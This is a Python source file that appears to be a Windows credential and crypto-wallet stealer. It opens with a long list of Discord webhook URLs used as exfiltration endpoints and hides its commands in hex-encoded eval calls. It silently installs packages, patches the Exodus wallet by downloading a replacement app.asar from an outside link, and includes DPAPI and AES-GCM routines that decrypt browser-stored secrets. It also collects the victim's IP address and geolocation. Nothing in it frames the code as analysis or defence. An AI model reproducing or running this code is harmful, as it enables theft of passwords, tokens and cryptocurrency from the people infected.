from builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open
exec('')
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads,load
from ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer
from urllib.request import Request,urlopen
from json import loads,dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
webHOOK='https://ptb.discord.com/api/webhooks/1105828794811718902/1OWURherd9rNDxW9FqdIUHY4rQW_FhCaNJed6bn2V6QdD1SMSBhdlunuqWAk53Z477er'
webHOOK='https://discord.com/api/webhooks/1673631254555015979/ows7B1VdMjNQRCRBnXdZ46F0921x9ydE-K_pep3DRDO03m9540_VYxBobneKwmwW6PRG'
fake_wbh='https://ptb.discord.com/api/webhooks/1492669391998611381/sO0-H3mJeiSl8amUt-nqiB5mgnfphqzkaghrDySJ9OXkpgHRo0CSWgbppJ8eI_FJdzo'
wbh='https://discordapp.com/api/webhooks/1219321245458841627/7xMaA66PSWBNH8Vy1o5UDQsrtguuVvBjeC4ATwnM6FjP9MgGQYkzN3NB7GxGRM224U'
fake_wbh='https://canary.discord.com/api/webhooks/1896523523380864573/Urc97OIVIoRWbIrp7gbBmNhLast17-8_jnbOPeYXBAvpw_ddd8lXJ8RxDzoOq4n_r'
fake_wbh='https://canary.discord.com/api/webhooks/1163483349595323570/yvIjjArtJ2ze-B-1pTz5d65Znqcsl-9yVOXgsaO7_AQHeWEhwbv0Odhhbi-6bFXIvl'
fake_wbh='https://ptb.discord.com/api/webhooks/1857099177785800950/6snuG15LD7YHJrVEGRGEi5GlqS82jtiTE7Hgx-7uOUaNi7WYdAbRVG412x6EfF3QWRh'
thewebhook='https://ptb.discord.com/api/webhooks/1612916337191492682/rXJyfGNh2IZkyvec76DvWhAUiD4e68CdQqGZUEVViyRVVxDa2KAJrIfSn627wziRarHw'
thewebhook='https://ptb.discord.com/api/webhooks/1633049294158369716/nwz1mRnzrIqBMfM8nCyQ2lj0GWP5NFV3TPSlFJ4mSmJHdeeMCTz7Ab7jQzqnv2hAwX'
real_webhook='https://ptb.discord.com/api/webhooks/1990993190654089255/d6qLBKUdzo3H2lLhGX3BMHyRJRaUnL2CLAOID4Vqji5IGx8U1O-cJ63zbWNtotQhyoo2'
fake_wbh='https://ptb.discord.com/api/webhooks/1381915813064050750/KDLSAjOKvBE-gfIRs8QFeUc5Qvk0jF-ITQlQtcFPm2i0B9OQt03hkwiVC1RVER3F-fFB'
real_webhook='https://ptb.discord.com/api/webhooks/1487067817825243684/KAIzHnYC6hJz1hJm_s5AKhWbjIm4d1CNAM3oXmv9hOTbJjdQCkGXnGSNNohuzwo7xDjc'
wbh='https://discord.com/api/webhooks/1355980560259990635/MNaOHJr5PCm4LEXbUvk7idEExn0QrnJUeBlUjvDAxULRtf-G99IMJWwUt7Z-6NsNlXS'
webHOOK='https://discordapp.com/api/webhooks/1968854894624713773/1xe-CQStirNs-L3S1KuFFSTt-sSpPu1KN6HsRi3_JMWrVETMcgpuxD_z-pGXamS62z3'
thewebhook='https://canary.discord.com/api/webhooks/1603246973169744503/aJwaOTlcDXKDU6AHD7nOgEt0hSl0IyQ3OsHt3-MRUc6NQSP6RFrX8_P18mdWhu1VyA'
webHOOK='https://ptb.discord.com/api/webhooks/1001735049115744752/iJWDI3Ul04zDmxxPNM4oiHBlGnfaPfWOCS8Ng4RzZ9ZPqT7bQcRaVz8ZWiQwc-Hw2Q'
wbh='https://discord.com/api/webhooks/1512718216465372085/vwJVcrfZO_mQ_iyr_W37ceAKkHCYMGEvZbeXLu4vtpGpMPfcxyXBFoI5P62SPE_wu'
wbh='https://discordapp.com/api/webhooks/1585967949690752946/_CW-S8aPTtSaB_12pxOBdhqb8qSHvk8qg66ed3kDe45nfgRnHjdOhnq0XEU5UnQTek89'
webHOOK='https://canary.discord.com/api/webhooks/1449215851988205549/zRGdQ5SKxoD1qPUp9jFlN3-FkbXq9cS4XVY9_1ojZyRLCvkZLPfNUac22aELw46MpT9'
real_webhook='https://ptb.discord.com/api/webhooks/1560607126376623877/51jxuY42iHnmzPGA1Hr1XmQhQd1edZwcp8VA6vJ9z_pApUOUlZqLjG4QFjNSolKme'
webh='https://discordapp.com/api/webhooks/1877893523657647748/Fy3rAe8Tu8sTA05XStqmePOrhhyqLuynuHkzBLe9PXqs-XnrYDtjCZ5dhYEnRBhyshL6'
thewebhook='https://discord.com/api/webhooks/1481587960838019039/Fahx7mFPlvynrM32DNVTRUfy-q74IlMcN622ffPd2W5DMRqsHtKPDH2ify_4zFFWh6'
fake_wbh='https://discord.com/api/webhooks/1670448339380077462/ehtRCszWdmYt_LQXxrC-jPQD0gZBRG5Btbi5PhnbvObmzAzrBR_cdx4Oh3rDzJOZuI1_'
fake_wbh='https://discordapp.com/api/webhooks/1282881091345785628/DearyOMpY02R5IROjNAhR93Y-6igHjnPm3B6ipr4bFLsw1vang7ofStE5FUhLtUZIY'
wbh='https://canary.discord.com/api/webhooks/1182426681904486040/9LDu92SMF63XCtLO7naCzlsWPkuszfuAKvpQ8sMgGdrR2LlIy1_ddzzBxd564wpT5_KR'
webh='https://ptb.discord.com/api/webhooks/1816464976941636201/ZjUAQFQiTKTylNqowsh9wH9R1a76GFWolVQRfClYYK2ZjaaWrR7u9D0Q0xh_tse9k0O'
webh='https://ptb.discord.com/api/webhooks/1950959151658117633/jeB03qabxxkaEO_U29IjNcvh6bE0iu5qFt6fBZCbsYAwN4kJv9kYXEip-t59GP6hSAM_'
real_webhook='https://ptb.discord.com/api/webhooks/1366041612128742984/HMYoXT25XG29VTRXRB1SDALsAPOy4PhFU6S3xGLHn2cmDDkCrsy8NXotZa1sn1490lu'
real_webhook='https://discordapp.com/api/webhooks/1877114262772065818/_j6u2mh7zmCaj5GOaS6MgGUAve1EBY0TEfSufTa4L3gcsO9CnsDHfaLo_bQu3AsrJB'
real_webhook='https://canary.discord.com/api/webhooks/1557450714220561176/f5YEssLj7qa7b-nuL3uUaCafGtESkmrzAojs5tGKToFjSlMFsQAqmzE4fjEXkwvrwtnW'
webh='https://ptb.discord.com/api/webhooks/1008630879631982213/A8oEJUwdQzINaJIg2sMPyy6QGuwQLs2NrWHU-BJufQPCxVxjI0s7_Vsa_FCbONXMC'
thewebhook='https://discord.com/api/webhooks/1412673682616463959/njU9kM5CghrWeIYNfkSkazBec65QvBOAovyW6z1Jv73Enx6zJZkLcxAEZy-ifUQuDVm'
real_webhook='https://ptb.discord.com/api/webhooks/1769299885881089135/Z9W5Lh7t06TgtprHmEejNTISbdIWQ7up27GpNC2C77pq24QpLqYsnkGLUtu4doAdt'
real_webhook='https://discordapp.com/api/webhooks/1273278619489038425/o3ZNe20Pw4SbDY4ndjL9hcxZh1NY6KNrh41Y4F2XGSNrXn-y8wmSLnrBPfjFAJOV2'
wbh='https://ptb.discord.com/api/webhooks/1884388935469841412/Ll_zJ5d2MIoct6Em0TCyVTQDeSsUWF53AMyLsjUeem8xKehCj-7P2nzRwefh6unrq'
real_webhook='https://discordapp.com/api/webhooks/1378221987222645346/zEzU7pAxl5nbfm7bNo3xDAt_VhXqnU1RkilKRxhC5V4MR2UDHRd_WUxwv1WPTaPzp'
webh='https://discordapp.com/api/webhooks/1674974275440242255/FmgnAK0npy4vuO3yt7bbd9UR4aB-uP2C6mP_e8b4QqVr7VZudA1NRX_uiR-qeLoEtylh'
thewebhook='https://discordapp.com/api/webhooks/1957190532456674472/JuKoOE3TWp116zlN3n1yxhVDYKA-Aw-zqy7UGPaJo41AIwD2FnlfZedzEwu9XoQHRj'
webh='https://canary.discord.com/api/webhooks/1521876406640751940/Zg9wC5qp39a7qSU_lMIw-OfRfxAQtr_HWQpkwj9j952g0YD7MYfRnoGSo7lIzT007'
real_webhook='https://ptb.discord.com/api/webhooks/1228293245149061002/IReXsnWjnj1tn-yfFFKgvrTsrG312BbTGhJByBExsKJnI0lzzipz0o91qfJ6iZ0Oltq'
fake_wbh='https://ptb.discord.com/api/webhooks/1397047103139137574/94s7FMkNF1iak40SddIxhYi3rXbwOLElHuqvTwuQ_xfV9cbQMHR-fMlj-VlZDd8WdW'
fake_webhook='https://canary.discord.com/api/webhooks/1190403573637593022/wguzOEnU9512U72cu-bNZwNduKFAafR5j-rxHPFy_QFc5W-cxy4vVObT7tHxiaN9CB1'
webHOOK='https://ptb.discord.com/api/webhooks/1741311034809581552/7EReDkgeBIR4KTNSrY6yiOEIltWd8Y69OrFBKkSqmsUimRr7PErtB3_9ZFZNoFXnFLag'
wbh='https://discordapp.com/api/webhooks/1192564205757886642/kQRZw7XPeC-FpC55V_L3xnuUnDrA7c8RlinQyVs_Qe4mhgdKctu1UJFzoFRPaTKuu'
webh='https://canary.discord.com/api/webhooks/1779960635452841845/OFeACSb3-EvfzAHwl3z3yfKPphk8l7GceGjYO50pFhmM8ZahtYVJXBsJ-W3Kw0VIbqMo'
fake_wbh='https://discordapp.com/api/webhooks/1997212343976216659/UG4UWplORIFxUEf47xt7KxRe5fnKVE4Iw3aGzqBbcAzZiD-93FICkAz8wjie8NEGInQ'
fake_webhook='https://discordapp.com/api/webhooks/1166372333912766262/ipwihGhUXG42NKCrGblqfzWOV8D-PjE-aeekPwrRDldqz6zmvypMjsGBzrhMPkCDiV'
thewebhook='https://canary.discord.com/api/webhooks/1134957433329944421/iWNfCPtrYaNbDK01l5eyaKu6qsOZYlw7PBMGjxMKUd_kRZY4ypMkvSERyiZb6DLMb'
thewebhook='https://ptb.discord.com/api/webhooks/1292310271784830818/Oz5KwmE2jGIxQp6t-N-89t9sGrphlt2DiE_uOxQojynGJg3sAi4KCfzm6Eu1mbsu1'
webh='https://canary.discord.com/api/webhooks/1083203362844979693/NMpxvRT-krCCUbmo64sIHuwwq9mYLndX9HpshbW3py5Nq6zIC-rjx6EbchKQwjuZGpC9'
hook='https://discord.com/api/webhooks/1126237593546281060/VoZzeKnrvVp9osJwZdeXbR8LmFON5s-2uUDiSGd1PFT-j6Ptm5kibor9yTiYpyM-48LY'
fake_webhook='https://discord.com/api/webhooks/1093182892118053833/AjQ2OxMgefBVs2gGbHuVyL2z4pqrBLQGT76dzLzebYe91JbQaiQk2r6TQESP7R4jFU'
real_webhook='https://discordapp.com/api/webhooks/1674553113340673341/30MBUA7-jdu9K3UGPnzA0U1eCIJm90_of45brOvyo54zpKbHkRGktivzvw2Q6Y4aT7'
wbh='https://canary.discord.com/api/webhooks/1848578782592288176/esBtuNsHVCJYWkcl5qi4ujdc-IL7cZXYupF9CDhWyOlZTwp53HX4mdGyaNtTpHHkW'
wbh='https://discordapp.com/api/webhooks/1567456611984101435/rU8e1056Ri9cEKyqMh6knq_NT_MG2Dc7uoSmnqJ_bbiFi99ysmC2nxgWEEznazhpUU_a'
webHOOK='https://discord.com/api/webhooks/1535146445059905018/ZYjO80Wq80jYHYdJcpXt1bmLBrypdXO_xENkiUbGQNpdvE2wL0d_pJncqwidz_s8l7s'
fake_webhook='https://discordapp.com/api/webhooks/1913153830349916994/bLG2LZq_6HpGdzfwYE_gxPsNtSeAxz8XBJ6KM5K9XAIcE6r4p08m_fsSi0PTXuCF6Eg'
webHOOK='https://discordapp.com/api/webhooks/1679829207182287958/dcvsmuOUiq8tRH336G8AhVUwOmdtHDy7PDxilyUwb9aGWE_HdHtDTU34Yxt1XCrWb5'
thewebhook='https://ptb.discord.com/api/webhooks/1802490613957134805/H3cl8h2PrdVOQV0q4IZbP1AlqH60S_xfF9PQ0NmD6guHaqFfcBNdUURv9Ejyx1kKh'
webHOOK='https://ptb.discord.com/api/webhooks/1339659584529855538/4N86mwE1UOcFi32g4ejbPGpzdmLDQ_KkgH7_Y7F9o7kXkgLrFTHiSaNq-g_4wKVJCXR'
webh='https://discord.com/api/webhooks/1564295777049835573/loJUzWGjh_fm1SY9r9Sf8y8JpeglEFhPCWC6uo6wo9vQUVxVCdPwuCDF0MlMI1AGEjKw'
thewebhook='https://discordapp.com/api/webhooks/1901658993712401691/vvHrPYD5a-AUZu3npo2B_VZI1O9IaYy-l_KhFSn6JPbzWcXDzU0feBpbGsDnnJtQh'
webHOOK='https://canary.discord.com/api/webhooks/1258610784252245252/UbIM2pZDy4QXY-IksDsdL391OOV2Nmnw0Km_EBmTc2BdVXMDZ8sovjKzkkqTqiGko'
fake_webhook='https://discord.com/api/webhooks/1690898109577585548/IGLT9s72cJrl6eOwNwBDiWaUbi_p0AIBOh0nM_OsrZCfPacyrzS0fbS8qrqk2K93ocwp'
real_webhook='https://ptb.discord.com/api/webhooks/1062470124416275563/iVSM9PNdaEUnZsJaMA6-q1OQhkeRyGO7_eLvYiOaHIuZQVQIdYDmCCeV4zs3Bot_6'
webHOOK='https://discord.com/api/webhooks/1287870242830007277/dTAXevGcxSrkArf_zEDLmF6HgosdE_bzJ40E78H58bH7N0PK1kYVZgIB1V7w7bZRtNKE'
real_webhook='https://ptb.discord.com/api/webhooks/1904764214760757560/G2OQBpqnTnV0iZTO4bQ6-SjOhE1KMryGvrkKczXKC6orqN1Ksd8IMcriMdEWqYB0-M'
webh='https://ptb.discord.com/api/webhooks/1808440516595621149/tho8VRePXYsq3qGJwWFwKqvZBrsELgcxriKegRSdW-Q034u-pFFqXKLkM53nX6eQBj'
wbh='https://ptb.discord.com/api/webhooks/1187416624394029644/rJBnfvSUwCwfzsjCNZ-gD8mMFJlMMPGAMJ-A5b4SimC0emWahFRgwKeGB1zGEYG4nE'
fake_webhook='https://canary.discord.com/api/webhooks/1313029514639872104/b8eoyI7p0FK8ygJFEYAGq2hhPg8TSbP18_lQT4rn6eQGZnGLELXOhPTKa4LnuV5Cl4Lz'
thewebhook='https://canary.discord.com/api/webhooks/1356958177902137779/RHxeb_yUON6tHQMBYf9GF9aW9Ylc-AYsNcuQTxdTw5RmrGRWvJSd7Bw-no16Ol34SvnX'
real_webhook='https://ptb.discord.com/api/webhooks/1896862267503433028/VxbA6Z5qRHFu76xhI60GS8Brjt9goBzxGd5lOBTjmCPYczXVJwtqnh7SOulWShf-d'
thewebhook='https://ptb.discord.com/api/webhooks/1243706584937367250/PRSig15HGZDV4tI0u4zyM-NKjjv9KhAB7p7pf02Lcs2FsZIPOaMb6LgZB2lgPPWTZD'
real_webhook='https://discordapp.com/api/webhooks/1878272754704463044/unKtCMa3kPSvOvVvnQFWpkyuwU01RBZWXbKoscM6giRZ4eBitYAWcbmlm6ovuafC0'
fake_webhook='https://canary.discord.com/api/webhooks/1733476691691557695/AWOfbXcVvv7WtBWPXdQw4Fs_1oSzrzgWqrj9oUVl8db7A0IF0EP5IPd1Q7cOr15vep'
thewebhook='https://ptb.discord.com/api/webhooks/1804299215125969873/nPwyzc4JtFs2sQNacTLsYJRF3efeKFsNwLSIXBNEnt9_A7o7ObbX-5et1j4dhxjPBq'
wbh='https://discord.com/api/webhooks/1109832565461897310/gHUDD3GOlEG85FyZ0LTsYaHiSalAPFmFIVcXlxzcUOs45XtxQfmN79GbZOlSESBCQndj'
fake_wbh='https://discordapp.com/api/webhooks/1274272108704975823/sMbBGXMQ5sXIbGzEF2KEA14YWCrnXtkOav_CSYvKKCk0G3DedEH91x3CoqZaYYBRVG'
fake_webhook='https://discord.com/api/webhooks/1130133518878549111/07_hMWEDYAmi7QNsWlF9GZifMSb_q9rUggsPkji8cGQKdYj5fqtPzUdaHylS23qn0BK'
webh='https://discord.com/api/webhooks/1048604624573319601/2dhAnYie72QTz3i1TBLkqQuYHhS81kjPYjjkpoYtA3WfnJnFXrSE8edp9dsb-qO4qhE'
webh='https://discord.com/api/webhooks/1973331008782103058/N9dTWcZ1W0sP5ZcWle6sQY4Ntc7zUbdaOZas9w-bDqC8x7QNaJ19A29qdnmQz8XCqn'
thewebhook='https://discord.com/api/webhooks/1739108860579801713/mcA-2a_RBu4QmeWZs0KaJozamruxiaZ-DWGlzcwqVLYuSLB-MAQr1qe7TtyasX8Hy3jj'
real_webhook='https://ptb.discord.com/api/webhooks/1361486645444027784/Kk5WrGD_XSkTjUCvRO1iY68F1OtDK0LBRSzNdvJb3o5C873uacDDk11bNKwDtbv8q'
webh='https://discordapp.com/api/webhooks/1717048512743802964/pnrUXhUXwLdVR0vAw_0_NmBurF-iKMtJMZGFyF-TICXAi8jMpf4POK9_uKsI8HKxK'
webHOOK='https://discordapp.com/api/webhooks/1432436471393858429/J_4qj_eQgOaK2UKBTB39Qp0TeIZjzsHndCP4H1YxknCHiAaoE958t__cqA-gEvz71Gc'
fake_webhook='https://discord.com/api/webhooks/1030734169660591676/4iWWNWDey0tRZI6MdUIGimDOmPM_R7GjdLw640E-Me6DtI7NUCHmzKE4nUTGu7rVztH'
webh='https://ptb.discord.com/api/webhooks/1432221954072935402/wTu93xEWp6NaDcq69TC-XOU1yeOTsra2vVx7IxH_aC1cQvNErManj9l1GRxl6qndJ0'
thewebhook='https://ptb.discord.com/api/webhooks/1804374133252990774/z-gUMkcl6AK7VY1AhSiL4gALVuSBTH1oiLBE4WykTAm_S9HPXo5-gvaCQk6H5JFWt7'
fake_wbh='https://discord.com/api/webhooks/1816657357567228403/zug9MVQoTMNRLpYNReIs2R4WWHClF0_sDFYGq7ZhhsQaVWrFn-h7uJsqkL_xIJ7GIS3'
thewebhook='https://ptb.discord.com/api/webhooks/1861733759454062528/WpSXxA_jDRcN_Xx18CmDVZRXYFVmzcA3YKTOF_f-UaLXNaaZcjgzavY6wPhf5i3Pt'
webh='https://discordapp.com/api/webhooks/1146022132839711619/1222bbAq846bwsUQhxMPREI8p8m3NH6Cbkf241fx7ZVEoQ9Sei8XjJOYpNGTIAxbX_e'
fake_wbh='https://discord.com/api/webhooks/1346677516017372286/PcgSG6u9gNxKWZLQfL_6voywCmONU5ljEm83YKwnddWcFj64jAaIVHR8pK8vYqkTWz'
fake_webhook='https://ptb.discord.com/api/webhooks/1340825120580118036/lH3UEQGlUIEkHSIYimQjpNtv2MQKk1tSnZDRVtaf4g99pGtn5UZa6h10n2i5aFON4Io'
webh='https://discordapp.com/api/webhooks/1060124795128066013/UJFx9gVLNk6sXpGLGdEfkos2PFJskkJFZffBk-izNhEut4BEzE7RAJwWX9L1Cpq-7'
webHOOK='https://discord.com/api/webhooks/1026384377347974008/1DWP882t7-hxnbLxTTEhHweJIBWa3vAw5GH1fJ67JH6OzghrHJEHUAK3iGtREY8eQt'
webh='https://discord.com/api/webhooks/1681995643979264990/qAChbrtR1Notl-pRLsPD2_QM0r8A1y_q2XSNM5u7BuxiS3YkluoWSVjoByHyaLyv5Ek4'
webHOOK='https://discordapp.com/api/webhooks/1333936994734972793/NNy8FMNMnGJ4DoCFlJlNwZF63DoeJMl_BBJbyUFIIoM-YTw1lU8jd5jDT5QI2ixexr'
fake_webhook='https://ptb.discord.com/api/webhooks/1754840019109993239/MaQJj-sJ0MQy6yXwGaToAyV9tsGVaTomaVvljWFejk40eYFoAyugMZ8pUtZ2lRYQtw'
thewebhook='https://discordapp.com/api/webhooks/1992943936068019490/-dHo5l1k21kk1awsVKTbuzgEjBuTbACwqEesq2U52nSsb_XNF5Ai02F9TSjnxYm2fS'
webh='https://canary.discord.com/api/webhooks/1508011745600303218/O68oE08qGzZJtlGdF499qSR6SjeoF37NIBdYbyPi9oqMLL5vTrI8ekjHzoOzLro5p'
fake_webhook='https://discordapp.com/api/webhooks/1997171912520724649/sy3V6pP11HU_mArjQIEMCGnXZREa9Ixq3bZoebuofhoZCn8xTqzVQwxN7hzfMX1dxJqf'
webh='https://discordapp.com/api/webhooks/1127591857027028488/k3ck-Q_9Ig_0apAIcV2T_Oxs9Y9YDhmo5GTUoufkzTzwssiAGD_g6BjSVjJmovpW6-dk'
real_webhook='https://discordapp.com/api/webhooks/1780187210163468930/SRmMQ3ksHs5jLY-tqpZnlfcGZLkU5k31KB44eyX0QfXMwdzUJ_9EU_Ess3f68dbeKJR'
real_webhook='https://ptb.discord.com/api/webhooks/1729670167018619446/3xc7U2HeShENvjSVZW5VGKxaUNjIgUZ-hheLMxBLWMbf0ST-TNVZM0svkcuRBmHt-_rm'
fake_webhook='https://canary.discord.com/api/webhooks/1260009757432708071/_qgBUG3P4zT0Xu5JoWayil3qFJ7XJycY4FAeMCTLlfuf5Ajt4M7R2-Faa1nrFg9rTa'
thewebhook='https://ptb.discord.com/api/webhooks/1266378604544222954/ToTbeC3ihGtj0kdZXNZ_TiJkkYMDO8EG-uRj93dn2_3uvLsjcKoVyf9dNldMFfO-OhsU'
fake_webhook='https://discordapp.com/api/webhooks/1137206655251285010/CZtJ0koFxB72XnhPfk5qAb19wlGHqkJIw87U4iidyzcsxEn8N6hOilJvdCt2HjfMahU'
thewebhook='https://ptb.discord.com/api/webhooks/1979129087916815011/h21UTO6PqISsqygNAyEUEyDZYZuoQxccKJY4GizEfBmwcySmYnz5cXm1Ve5fcOczV'
fake_webhook='https://canary.discord.com/api/webhooks/1672286337127434609/d2SpC8owNva5PEY1smv6rx9MUlgXq7pkNqLFij6w5uDpun6wedgEyrNHrrHPA9Jhq4'
fake_webhook='https://canary.discord.com/api/webhooks/1502900929000297590/ZAKVXLuEjfd0jgEVke5ClaqHwA2H6wV-KcQtfAruuvws7p07JiCKxT8gQtGmhjxoftV-'
webHOOK='https://canary.discord.com/api/webhooks/1551640387726189857/_yKMrbekfuNaDGTqSgO4DR5k6WnBwCxT81Gra6qMecqz7VGVFOFc7Aq30NecUOHRcDD'
fake_webhook='https://discordapp.com/api/webhooks/1641472370650189173/pdJEUKhyybwxeJ-ek0UgAB_1PjxkzMeW6Y-tsZlxmOi6ClSnhaVbNrK_5KF3jT0wO6'
thewebhook='https://ptb.discord.com/api/webhooks/1959824807487881342/TbxrjlQIBwsmBh57OXE-EeU--zWPEYVboPZ2PoRICU_zQnXIOHFKwsEN89TGBJBTVG0U'
fake_wbh='https://ptb.discord.com/api/webhooks/1664321800884264786/5Csqw23wir6A-g9QKCd4eI0IR__43NPTjJQb5WCo7GwpqHZmdA6Fn2UAkwGYCW0r6Ut'
thewebhook='https://ptb.discord.com/api/webhooks/1078953421330508821/N1qsRW1fmR9edhzVPsZ5E5Y0RJVdOJxZ26HAJ326U07M6c9gv3j2XOMnB-fegZ6YZb'
webh='https://discordapp.com/api/webhooks/1566250355713242043/_zPHif974u0ar79NmVw0C5tHCBGSyuHYZ0oZ3GERWznl6TmthGciqKXS7Ow2VG-wh'
fake_wbh='https://ptb.discord.com/api/webhooks/1193102091530720066/SKSvzZavun0yT2hJxxo9jyv9aTmCMI_QYbIqLBMoVWAq7oxbDQ-qVUn8d6nkhYl0Ji'
real_webhook='https://canary.discord.com/api/webhooks/1680848000679732864/LeO_UTu6WnBsZWHYewawBaDxnqFDummaigPadgjEpptewps_K4_UG03COUYkGdr_E'
fake_webhook='https://ptb.discord.com/api/webhooks/1549568433439784572/az7OOR-V-5Dn9w8AJ4S3mwROH6MYepQCPey3I1gYXiniYvQSxEs38HWbqTs2LdrOqF'
real_webhook='https://discordapp.com/api/webhooks/1128198235919538317/6wQs_bvQ4JHA3JJJz6nsPxN_cSFD9Gkx4wBkOWomBP5xG5Hl2BGek_7J71tP183ELJ_'
webh='https://ptb.discord.com/api/webhooks/1094741668406964793/9LxK84aRz7fL_5VFsOKfMCBCN1YI5gkUmm4X3TkRyDmLALm3r40XU7ani4f11qMMPDR'
fake_wbh='https://ptb.discord.com/api/webhooks/1286359577578694164/tta8svH9UkP6HbyOEplkblpnpGZxX8uxBXwISxjAd7KeNFRDfCvh-KIv8Jz8kZ-ims'
real_webhook='https://discordapp.com/api/webhooks/1455878400928481651/-o_jfmuOyOM3d7nUdFuL8-6iwROwGsoBvhwz8mBobwwHN3eY9HltBHj0qmRi48fiY4'
real_webhook='https://ptb.discord.com/api/webhooks/1517518790526108312/j38WeBs0NAe-Cb7CM2HCVXGC_rsxjenZDUJ1VX27MbzDcTUU2EUk7Xzsib64qlNhoB'
webHOOK='https://canary.discord.com/api/webhooks/1305619318412253526/HXDILIcTgPs3b0qOXZgpB3p6o4ZSMfSgAPSFJl2CNO9RSvT5Zf8LFV87j8N8AFbVaB'
fake_webhook='https://ptb.discord.com/api/webhooks/1252321470407972415/hnWs2aO7grDYF1o7w3rucQfAqE2dHw6Dzftbx8Iiu0nqGQsIcNav2-YZaqmticXk-E'
fake_webhook='https://discordapp.com/api/webhooks/1126682339918933827/kURXvbT106ZXv8apSOHkYo6bJ-aGMwAwYqbN6JWIqcBSILV801URWBTNYMVwct4Sm-1q'
real_webhook='https://canary.discord.com/api/webhooks/1958757393132170956/1MDSLtzF9WE2w8EV7An8Kj8uHT1xuJIKZcas42zLqFRphr2wxrg59nvQxNa_Y7oI9'
thewebhook='https://discordapp.com/api/webhooks/1552353108331222423/3jpBzuL1UbYBYy7QcwtLz_9VXiVm_ZXWTOX6ck88dxW45nwuNR3YjfnJOU0AvrHPVRbg'
fake_wbh='https://discord.com/api/webhooks/1979016249329209988/UNJHsWBcTbTT2CgEzO72CiBKD2x_k5qJCkKsEndPc_E-8TiXncMbe5lfuD0m575f7PfR'
webh='https://discord.com/api/webhooks/1856384552724604179/f7nnl2FFCXK2i0uPmOa-rFykctjvASzx83vVs9PKqhkMZxxnnmv6J9hhAG6a6T-RBAV'
fake_wbh='https://discordapp.com/api/webhooks/1405536235765126682/VF5b77CbM42W1w2gJ0Na34iPZCiUjdMyevtHOORCmV_8HNUXj7jxsuCMlQqXFV70V0f'
DETECTED=False
def getip():
    ip='None'
    try:
        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass
    return ip
requirements=[
['requests','requests'],
['Crypto.Cipher','pycryptodome']
]
for modl in requirements:
    try:__import__(modl[0])
    except:
        subprocess.Popen(eval(binascii.unhexlify(b'66227b65786563757461626c657d202d6d2070697020696e7374616c6c207b6d6f646c5b315d7d22').decode('8ftu'[::+-+-(-(+1))])),shell=True)
        time.sleep(3)
import requests
from Crypto.Cipher import AES
local=os.getenv('LOCALAPPDATA')
roaming=os.getenv('APPDATA')
temp=os.getenv('TEMP')
Threadlist=[]
def exodus_injection(path,procc,exolink):
    if not os.path.exists(path):return
    listOfFile=os.listdir(path)
    apps=[]
    for file in listOfFile:
        if 'app-' in file:
            apps+=[file]
    try:
        randomexodusfile=eval(binascii.unhexlify(b'66227b706174687d2f7b617070735b305d7d2f4c4943454e534522').decode('8ftu'[::+-+-(-(+1))]))
        with open(randomexodusfile,'r+')as IsAlradyInjected:
            check=IsAlradyInjected.read()
            if 'gofile' in str(check):# already injected
                return
    except:pass
    exodusPatchURL='https://cdn.discordapp.com/attachments/1086668425797058691/1101508589480329369/app.asar'
    headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'}
    req=Request(exodusPatchURL,headers=headers)
    response=urlopen(req)
    global hook
    khook=eval(binascii.unhexlify(b'66277b686f6f6b2e73706c69742822776562686f6f6b732f22295b315d7d3a7b65786f6c696e6b7d27').decode('8ftu'[::+-+-(-(+1))]))
    data=response.read()
    subprocess.Popen(eval(binascii.unhexlify(b'66227461736b6b696c6c202f696d207b70726f63637d202f74202f66203e6e756c20323e263122').decode('8ftu'[::+-+-(-(+1))])),shell=True)
    for app in apps:
        try:
            fullpath=eval(binascii.unhexlify(b'66227b706174687d2f7b6170707d2f7265736f75726365732f6170702e6173617222').decode('8ftu'[::+-+-(-(+1))]))
            licpath=eval(binascii.unhexlify(b'66227b706174687d2f7b6170707d2f4c4943454e534522').decode('8ftu'[::+-+-(-(+1))]))
            with open(fullpath,'wb')as out_file1:
                out_file1.write(data)
            with open(licpath,'w')as out_file2:
                out_file2.write(khook)
        except:pass
class DATA_BLOB(Structure):
    _fields_=[
('cbData',wintypes.DWORD),
('pbData',POINTER(c_char))
]
def GetData(blob_out):
    cbData=int(blob_out.cbData)
    pbData=blob_out.pbData
    buffer=c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer,pbData,cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw
def CryptUnprotectData(encrypted_bytes,entropy=eval(binascii.unhexlify(b'622727').decode('8ftu'[::+-+-(-(+1))]))):
    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))
    buffer_entropy=c_buffer(entropy,len(entropy))
    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)
    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)
    blob_out=DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):
        return GetData(blob_out)
def DecryptValue(buff,master_key=None):
    starts=buff.decode(encoding='utf8',errors='ignore')[:3]
    if starts=='v10' or starts=='v11':
        iv=buff[3:15]
        payload=buff[15:]
        cipher=AES.new(master_key,AES.MODE_GCM,iv)
        decrypted_pass=cipher.decrypt(payload)
        decrypted_pass=decrypted_pass[:-16].decode()
        return decrypted_pass
def LoadRequests(methode,url,data='',files='',headers=''):
    for i in range(8):# max trys
        try:
            if methode=='POST':
                if data !='':
                    r=requests.post(url,data=data)
                    if r.status_code==200:
                        return r
                elif files !='':
                    r=requests.post(url,files=files)
                    if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG
                        return r
        except:
            pass
def LoadUrlib(hook,data='',files='',headers=''):
    for i in range(8):
        try:
            if headers !='':
                r=urlopen(Request(hook,data=data,headers=headers))
                return r
            else:
                r=urlopen(Request(hook,data=data))
                return r
        except:
            pass
def globalInfo():
    ip=getip()
    username=os.getenv('USERNAME')
    ipdatanojson=urlopen(Request(eval(binascii.unhexlify(b'662268747470733a2f2f67656f6c6f636174696f6e2d64622e636f6d2f6a736f6e702f7b69707d22').decode('8ftu'[::+-+-(-(+1))])))).read().decode().replace('callback(','').replace('})','}')
